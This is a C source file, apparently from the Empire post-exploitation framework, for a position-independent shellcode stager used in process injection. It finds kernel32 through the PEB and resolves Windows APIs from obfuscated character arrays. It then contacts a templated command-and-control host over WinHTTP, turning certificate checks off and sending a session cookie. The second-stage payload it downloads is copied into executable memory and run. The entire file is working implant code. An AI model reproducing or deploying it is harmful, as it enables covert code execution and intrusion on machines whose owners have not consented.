/*
 * PIC (Position-Independent Code) shellcode stager for Empire.
 * Functionally equivalent to windows.c but compiled as raw shellcode
 * for process injection via BOF modules.
 *
 * Compilation (handled by shellcode_compiler.py):
 *   x86_64-w64-mingw32-gcc -nostdlib -Os -s -fno-ident
 *       -fno-asynchronous-unwind-tables -fno-toplevel-reorder
 *       -Wl,--no-seh -Wl,-e,AlignRSP -o sc.exe sc.c
 *   x86_64-w64-mingw32-objcopy -O binary -j .text sc.exe sc.bin
 *
 * Function layout: AlignRSP must be the first function in this file.
 * Compile with -fno-toplevel-reorder to preserve source order in .text.
 */

typedef unsigned char       BYTE;
typedef unsigned short      WORD;
typedef unsigned short      WCHAR;
typedef unsigned int        DWORD;
typedef unsigned long long  ULONG_PTR;
typedef unsigned long long  SIZE_T;
typedef long long           LONG_PTR;
typedef void*               HANDLE;
typedef void*               HINTERNET;
typedef void*               PVOID;
typedef void*               LPVOID;
typedef int                 BOOL;

#define TRUE  1
#define FALSE 0
#define NULL  ((void*)0)

#define MEM_COMMIT              0x00001000
#define MEM_RESERVE             0x00002000
#define PAGE_EXECUTE_READWRITE  0x40

#define WINHTTP_ACCESS_TYPE_NO_PROXY    1
#define WINHTTP_FLAG_SECURE             0x00800000
#define WINHTTP_ADDREQ_FLAG_ADD         0x20000000
#define WINHTTP_ADDREQ_FLAG_REPLACE     0x80000000
#define WINHTTP_NO_HEADER_INDEX         ((DWORD*)NULL)
#define WINHTTP_QUERY_STATUS_CODE       19
#define WINHTTP_QUERY_FLAG_NUMBER       0x20000000
#define WINHTTP_QUERY_STATUS_TEXT       20
#define WINHTTP_HEADER_NAME_BY_INDEX    ((WCHAR*)NULL)

#define SECURITY_FLAG_IGNORE_UNKNOWN_CA        0x00000100
#define SECURITY_FLAG_IGNORE_CERT_DATE_INVALID 0x00002000
#define SECURITY_FLAG_IGNORE_CERT_CN_INVALID   0x00001000
#define SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE  0x00000200
#define WINHTTP_OPTION_SECURITY_FLAGS          31

typedef void* (__attribute__((ms_abi)) *fnLoadLibraryA)(const char*);
typedef void* (__attribute__((ms_abi)) *fnGetProcAddress)(void*, const char*);

typedef LPVOID (__attribute__((ms_abi)) *fnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef HANDLE (__attribute__((ms_abi)) *fnGetProcessHeap)(void);
typedef LPVOID (__attribute__((ms_abi)) *fnHeapAlloc)(HANDLE, DWORD, SIZE_T);
typedef LPVOID (__attribute__((ms_abi)) *fnHeapReAlloc)(HANDLE, DWORD, LPVOID, SIZE_T);
typedef BOOL   (__attribute__((ms_abi)) *fnHeapFree)(HANDLE, DWORD, LPVOID);
typedef BOOL   (__attribute__((ms_abi)) *fnFlushInstructionCache)(HANDLE, PVOID, SIZE_T);
typedef HANDLE (__attribute__((ms_abi)) *fnGetCurrentProcess)(void);

typedef HINTERNET (__attribute__((ms_abi)) *fnWinHttpOpen)(const WCHAR*, DWORD, const WCHAR*, const WCHAR*, DWORD);
typedef HINTERNET (__attribute__((ms_abi)) *fnWinHttpConnect)(HINTERNET, const WCHAR*, WORD, DWORD);
typedef HINTERNET (__attribute__((ms_abi)) *fnWinHttpOpenRequest)(HINTERNET, const WCHAR*, const WCHAR*, const WCHAR*, const WCHAR*, const WCHAR**, DWORD);
typedef BOOL      (__attribute__((ms_abi)) *fnWinHttpSetOption)(HINTERNET, DWORD, LPVOID, DWORD);
typedef BOOL      (__attribute__((ms_abi)) *fnWinHttpAddRequestHeaders)(HINTERNET, const WCHAR*, DWORD, DWORD);
typedef BOOL      (__attribute__((ms_abi)) *fnWinHttpSendRequest)(HINTERNET, const WCHAR*, DWORD, LPVOID, DWORD, DWORD, ULONG_PTR);
typedef BOOL      (__attribute__((ms_abi)) *fnWinHttpReceiveResponse)(HINTERNET, LPVOID);
typedef BOOL      (__attribute__((ms_abi)) *fnWinHttpQueryHeaders)(HINTERNET, DWORD, const WCHAR*, LPVOID, DWORD*, DWORD*);
typedef BOOL      (__attribute__((ms_abi)) *fnWinHttpQueryDataAvailable)(HINTERNET, DWORD*);
typedef BOOL      (__attribute__((ms_abi)) *fnWinHttpReadData)(HINTERNET, LPVOID, DWORD, DWORD*);
typedef BOOL      (__attribute__((ms_abi)) *fnWinHttpCloseHandle)(HINTERNET);

struct Kernel32Funcs {
    fnVirtualAlloc           pVirtualAlloc;
    fnGetProcessHeap         pGetProcessHeap;
    fnHeapAlloc              pHeapAlloc;
    fnHeapReAlloc            pHeapReAlloc;
    fnHeapFree               pHeapFree;
    fnFlushInstructionCache  pFlushInstructionCache;
    fnGetCurrentProcess      pGetCurrentProcess;
};

struct WinHttpFuncs {
    fnWinHttpOpen                   pOpen;
    fnWinHttpConnect                pConnect;
    fnWinHttpOpenRequest            pOpenRequest;
    fnWinHttpSetOption              pSetOption;
    fnWinHttpAddRequestHeaders      pAddRequestHeaders;
    fnWinHttpSendRequest            pSendRequest;
    fnWinHttpReceiveResponse        pReceiveResponse;
    fnWinHttpQueryHeaders           pQueryHeaders;
    fnWinHttpQueryDataAvailable     pQueryDataAvailable;
    fnWinHttpReadData               pReadData;
    fnWinHttpCloseHandle            pCloseHandle;
};

/* Forward declaration — AlignRSP calls ShellcodeMain */
void __attribute__((ms_abi)) ShellcodeMain(void);

/*
 * Entry point: align RSP to 16 bytes before calling ShellcodeMain.
 * x64 ABI requires 16-byte stack alignment for API calls.
 * MUST be the first function in this file — first bytes of .text.
 */
__attribute__((section(".text")))
void __attribute__((ms_abi, naked)) AlignRSP(void) {
    __asm__ volatile (
        ".intel_syntax noprefix\n"
        "push rdi\n"
        "mov rdi, rsp\n"
        "and rsp, -16\n"
        "sub rsp, 32\n"
        "call ShellcodeMain\n"
        "mov rsp, rdi\n"
        "pop rdi\n"
        "ret\n"
        ".att_syntax prefix\n"
    );
}

/*
 * MinGW emits calls to ___chkstk_ms for functions with stack frames
 * larger than 4KB. Stub it out since we compile with -nostdlib.
 */
__attribute__((section(".text")))
void __attribute__((naked)) ___chkstk_ms(void) {
    __asm__ volatile ("ret\n");
}

/* Inline helpers for PIC — no CRT dependency */
__attribute__((always_inline))
static inline int pic_strcmp(const char* a, const char* b) {
    while (*a && *a == *b) { a++; b++; }
    return (unsigned char)*a - (unsigned char)*b;
}

__attribute__((always_inline))
static inline void pic_memcpy(void* dst, const void* src, SIZE_T n) {
    BYTE* d = (BYTE*)dst;
    const BYTE* s = (const BYTE*)src;
    while (n--) *d++ = *s++;
}

__attribute__((always_inline))
static inline void pic_memset(void* dst, int val, SIZE_T n) {
    BYTE* d = (BYTE*)dst;
    while (n--) *d++ = (BYTE)val;
}

__attribute__((always_inline))
static inline SIZE_T pic_wcslen(const WCHAR* s) {
    SIZE_T len = 0;
    while (s[len]) len++;
    return len;
}

__attribute__((always_inline))
static inline void pic_wcscpy(WCHAR* dst, const WCHAR* src) {
    while ((*dst++ = *src++));
}

/*
 * Find kernel32.dll base address via PEB.
 * x64: PEB at gs:[0x60], Ldr at PEB+0x18,
 * InMemoryOrderModuleList at Ldr+0x20.
 *
 * When walking InMemoryOrderModuleList, entry points to
 * InMemoryOrderLinks (struct offset 0x10). Offsets from entry:
 *   DllBase            = entry + 0x20  (struct 0x30 - 0x10)
 *   BaseDllName.Buffer = entry + 0x50  (struct 0x58 + 0x08 - 0x10)
 */
__attribute__((section(".text")))
static void* find_kernel32(void) {
    void* peb;
    __asm__ volatile ("mov %%gs:0x60, %0" : "=r"(peb));

    void* ldr = *(void**)((BYTE*)peb + 0x18);
    BYTE* head = (BYTE*)ldr + 0x20;
    BYTE* entry = *(BYTE**)head;

    while (entry != head) {
        WCHAR* dllName = *(WCHAR**)((BYTE*)entry + 0x50);
        void*  dllBase = *(void**)((BYTE*)entry + 0x20);

        if (dllName) {
            WCHAR k[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};
            WCHAR K[] = {'K','E','R','N','E','L','3','2','.','D','L','L',0};
            int match = 1;
            for (int i = 0; k[i]; i++) {
                if (dllName[i] != k[i] && dllName[i] != K[i]) { match = 0; break; }
            }
            if (match) return dllBase;
        }
        entry = *(BYTE**)entry;
    }
    return NULL;
}

/*
 * Parse PE export table to find a function by name.
 */
__attribute__((section(".text")))
static void* find_export(void* base, const char* name) {
    BYTE* b = (BYTE*)base;
    DWORD pe_off = *(DWORD*)(b + 0x3C);
    DWORD export_rva = *(DWORD*)(b + pe_off + 0x88);
    if (!export_rva) return NULL;

    BYTE* exports = b + export_rva;
    DWORD numNames     = *(DWORD*)(exports + 0x18);
    DWORD namesRva     = *(DWORD*)(exports + 0x20);
    DWORD ordinalsRva  = *(DWORD*)(exports + 0x24);
    DWORD funcsRva     = *(DWORD*)(exports + 0x1C);

    DWORD* names    = (DWORD*)(b + namesRva);
    WORD*  ordinals = (WORD*)(b + ordinalsRva);
    DWORD* funcs    = (DWORD*)(b + funcsRva);

    for (DWORD i = 0; i < numNames; i++) {
        const char* fn = (const char*)(b + names[i]);
        if (pic_strcmp(fn, name) == 0) {
            return b + funcs[ordinals[i]];
        }
    }
    return NULL;
}

__attribute__((section(".text")))
static BOOL resolve_kernel32(void* k32, fnGetProcAddress pGetProcAddress, struct Kernel32Funcs* k) {
    char s_VirtualAlloc[]          = {'V','i','r','t','u','a','l','A','l','l','o','c',0};
    char s_GetProcessHeap[]        = {'G','e','t','P','r','o','c','e','s','s','H','e','a','p',0};
    char s_HeapAlloc[]             = {'H','e','a','p','A','l','l','o','c',0};
    char s_HeapReAlloc[]           = {'H','e','a','p','R','e','A','l','l','o','c',0};
    char s_HeapFree[]              = {'H','e','a','p','F','r','e','e',0};
    char s_FlushInstructionCache[] = {'F','l','u','s','h','I','n','s','t','r','u','c','t','i','o','n','C','a','c','h','e',0};
    char s_GetCurrentProcess[]     = {'G','e','t','C','u','r','r','e','n','t','P','r','o','c','e','s','s',0};

    k->pVirtualAlloc          = (fnVirtualAlloc)pGetProcAddress(k32, s_VirtualAlloc);
    k->pGetProcessHeap        = (fnGetProcessHeap)pGetProcAddress(k32, s_GetProcessHeap);
    k->pHeapAlloc             = (fnHeapAlloc)pGetProcAddress(k32, s_HeapAlloc);
    k->pHeapReAlloc           = (fnHeapReAlloc)pGetProcAddress(k32, s_HeapReAlloc);
    k->pHeapFree              = (fnHeapFree)pGetProcAddress(k32, s_HeapFree);
    k->pFlushInstructionCache = (fnFlushInstructionCache)pGetProcAddress(k32, s_FlushInstructionCache);
    k->pGetCurrentProcess     = (fnGetCurrentProcess)pGetProcAddress(k32, s_GetCurrentProcess);

    return k->pVirtualAlloc && k->pGetProcessHeap && k->pHeapAlloc &&
           k->pHeapReAlloc && k->pHeapFree && k->pFlushInstructionCache &&
           k->pGetCurrentProcess;
}

__attribute__((section(".text")))
static BOOL resolve_winhttp(fnLoadLibraryA pLoadLibraryA, fnGetProcAddress pGetProcAddress, struct WinHttpFuncs* w) {
    char s_winhttp[] = {'w','i','n','h','t','t','p','.','d','l','l',0};
    void* hWinHttp = pLoadLibraryA(s_winhttp);
    if (!hWinHttp) return FALSE;

    char s_Open[]                  = {'W','i','n','H','t','t','p','O','p','e','n',0};
    char s_Connect[]               = {'W','i','n','H','t','t','p','C','o','n','n','e','c','t',0};
    char s_OpenRequest[]           = {'W','i','n','H','t','t','p','O','p','e','n','R','e','q','u','e','s','t',0};
    char s_SetOption[]             = {'W','i','n','H','t','t','p','S','e','t','O','p','t','i','o','n',0};
    char s_AddRequestHeaders[]     = {'W','i','n','H','t','t','p','A','d','d','R','e','q','u','e','s','t','H','e','a','d','e','r','s',0};
    char s_SendRequest[]           = {'W','i','n','H','t','t','p','S','e','n','d','R','e','q','u','e','s','t',0};
    char s_ReceiveResponse[]       = {'W','i','n','H','t','t','p','R','e','c','e','i','v','e','R','e','s','p','o','n','s','e',0};
    char s_QueryHeaders[]          = {'W','i','n','H','t','t','p','Q','u','e','r','y','H','e','a','d','e','r','s',0};
    char s_QueryDataAvailable[]    = {'W','i','n','H','t','t','p','Q','u','e','r','y','D','a','t','a','A','v','a','i','l','a','b','l','e',0};
    char s_ReadData[]              = {'W','i','n','H','t','t','p','R','e','a','d','D','a','t','a',0};
    char s_CloseHandle[]           = {'W','i','n','H','t','t','p','C','l','o','s','e','H','a','n','d','l','e',0};

    w->pOpen                = (fnWinHttpOpen)pGetProcAddress(hWinHttp, s_Open);
    w->pConnect             = (fnWinHttpConnect)pGetProcAddress(hWinHttp, s_Connect);
    w->pOpenRequest         = (fnWinHttpOpenRequest)pGetProcAddress(hWinHttp, s_OpenRequest);
    w->pSetOption           = (fnWinHttpSetOption)pGetProcAddress(hWinHttp, s_SetOption);
    w->pAddRequestHeaders   = (fnWinHttpAddRequestHeaders)pGetProcAddress(hWinHttp, s_AddRequestHeaders);
    w->pSendRequest         = (fnWinHttpSendRequest)pGetProcAddress(hWinHttp, s_SendRequest);
    w->pReceiveResponse     = (fnWinHttpReceiveResponse)pGetProcAddress(hWinHttp, s_ReceiveResponse);
    w->pQueryHeaders        = (fnWinHttpQueryHeaders)pGetProcAddress(hWinHttp, s_QueryHeaders);
    w->pQueryDataAvailable  = (fnWinHttpQueryDataAvailable)pGetProcAddress(hWinHttp, s_QueryDataAvailable);
    w->pReadData            = (fnWinHttpReadData)pGetProcAddress(hWinHttp, s_ReadData);
    w->pCloseHandle         = (fnWinHttpCloseHandle)pGetProcAddress(hWinHttp, s_CloseHandle);

    return w->pOpen && w->pConnect && w->pOpenRequest && w->pSetOption &&
           w->pAddRequestHeaders && w->pSendRequest && w->pReceiveResponse &&
           w->pQueryHeaders && w->pQueryDataAvailable && w->pReadData && w->pCloseHandle;
}

__attribute__((section(".text")))
static BOOL download_stage(struct Kernel32Funcs* k, struct WinHttpFuncs* w,
                           const WCHAR* host, WORD port, const WCHAR* path,
                           BOOL useHttps, const WCHAR* cookie,
                           BYTE** outBuf, DWORD* outLen) {
    *outBuf = NULL;
    *outLen = 0;

    WCHAR ua[] = {'M','o','z','i','l','l','a','/','5','.','0',0};
    WCHAR get[] = {'G','E','T',0};

    HINTERNET hSession = w->pOpen(ua, WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
    if (!hSession) return FALSE;

    HINTERNET hConnect = w->pConnect(hSession, host, port, 0);
    if (!hConnect) { w->pCloseHandle(hSession); return FALSE; }

    DWORD flags = useHttps ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = w->pOpenRequest(hConnect, get, path, NULL, NULL, NULL, flags);
    if (!hRequest) { w->pCloseHandle(hConnect); w->pCloseHandle(hSession); return FALSE; }

    if (useHttps) {
        DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                         SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                         SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                         SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        w->pSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
    }

    /* Build "Cookie: <value>\r\n" header on the stack */
    WCHAR hdrPrefix[] = {'C','o','o','k','i','e',':',' ',0};
    WCHAR hdrSuffix[] = {'\r','\n',0};
    SIZE_T prefixLen = pic_wcslen(hdrPrefix);
    SIZE_T cookieLen = pic_wcslen(cookie);
    SIZE_T suffixLen = pic_wcslen(hdrSuffix);
    SIZE_T totalLen = prefixLen + cookieLen + suffixLen + 1;

    HANDLE heap = k->pGetProcessHeap();
    WCHAR* headerLine = (WCHAR*)k->pHeapAlloc(heap, 0, totalLen * sizeof(WCHAR));
    if (!headerLine) { w->pCloseHandle(hRequest); w->pCloseHandle(hConnect); w->pCloseHandle(hSession); return FALSE; }

    pic_wcscpy(headerLine, hdrPrefix);
    pic_wcscpy(headerLine + prefixLen, cookie);
    pic_wcscpy(headerLine + prefixLen + cookieLen, hdrSuffix);

    w->pAddRequestHeaders(hRequest, headerLine, (DWORD)-1,
                          WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    k->pHeapFree(heap, 0, headerLine);

    if (!w->pSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0))
        goto cleanup;

    if (!w->pReceiveResponse(hRequest, NULL))
        goto cleanup;

    DWORD status = 0, statusSize = sizeof(status);
    if (!w->pQueryHeaders(hRequest,
                          WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                          WINHTTP_HEADER_NAME_BY_INDEX,
                          &status, &statusSize, WINHTTP_NO_HEADER_INDEX))
        goto cleanup;

    if (status < 200 || status >= 300)
        goto cleanup;

    BYTE* buf = NULL;
    DWORD cap = 0, len = 0;

    for (;;) {
        DWORD avail = 0;
        if (!w->pQueryDataAvailable(hRequest, &avail)) goto fail_buf;
        if (avail == 0) break;

        if (len + avail > cap) {
            DWORD newCap = (cap == 0) ? (avail * 2) : (cap * 2);
            while (newCap < len + avail) newCap *= 2;

            if (!buf) {
                buf = (BYTE*)k->pHeapAlloc(heap, 0, newCap);
            } else {
                buf = (BYTE*)k->pHeapReAlloc(heap, 0, buf, newCap);
            }
            if (!buf) goto fail_buf;
            cap = newCap;
        }

        DWORD bytesRead = 0;
        if (!w->pReadData(hRequest, buf + len, avail, &bytesRead)) goto fail_buf;
        len += bytesRead;
    }

    *outBuf = buf;
    *outLen = len;
    w->pCloseHandle(hRequest);
    w->pCloseHandle(hConnect);
    w->pCloseHandle(hSession);
    return TRUE;

fail_buf:
    if (buf) k->pHeapFree(heap, 0, buf);
cleanup:
    w->pCloseHandle(hRequest);
    w->pCloseHandle(hConnect);
    w->pCloseHandle(hSession);
    return FALSE;
}

__attribute__((section(".text")))
static void execute_payload(struct Kernel32Funcs* k, const BYTE* data, DWORD len) {
    void* execMem = k->pVirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem) return;
    pic_memcpy(execMem, data, len);
    k->pFlushInstructionCache(k->pGetCurrentProcess(), execMem, len);
    ((void(*)(void))execMem)();
}

__attribute__((section(".text")))
void __attribute__((ms_abi)) ShellcodeMain(void) {
    void* k32 = find_kernel32();
    if (!k32) return;

    char s_LoadLibraryA[]  = {'L','o','a','d','L','i','b','r','a','r','y','A',0};
    char s_GetProcAddress[] = {'G','e','t','P','r','o','c','A','d','d','r','e','s','s',0};

    fnLoadLibraryA  pLoadLibraryA  = (fnLoadLibraryA)find_export(k32, s_LoadLibraryA);
    fnGetProcAddress pGetProcAddress = (fnGetProcAddress)find_export(k32, s_GetProcAddress);
    if (!pLoadLibraryA || !pGetProcAddress) return;

    struct Kernel32Funcs kf;
    struct WinHttpFuncs wf;
    pic_memset(&kf, 0, sizeof(kf));
    pic_memset(&wf, 0, sizeof(wf));

    if (!resolve_kernel32(k32, pGetProcAddress, &kf)) return;
    if (!resolve_winhttp(pLoadLibraryA, pGetProcAddress, &wf)) return;

    const WCHAR host[]    = {{ host }};
    WORD        port      = {{ port }};
    const WCHAR path[]    = {{ path }};
    BOOL        useHttps  = {{ use_https }};
    const WCHAR cookie[]  = {{ cookie }};

    BYTE* data = NULL;
    DWORD size = 0;

    if (!download_stage(&kf, &wf, host, port, path, useHttps, cookie, &data, &size))
        return;

    execute_payload(&kf, data, size);
    kf.pHeapFree(kf.pGetProcessHeap(), 0, data);
}
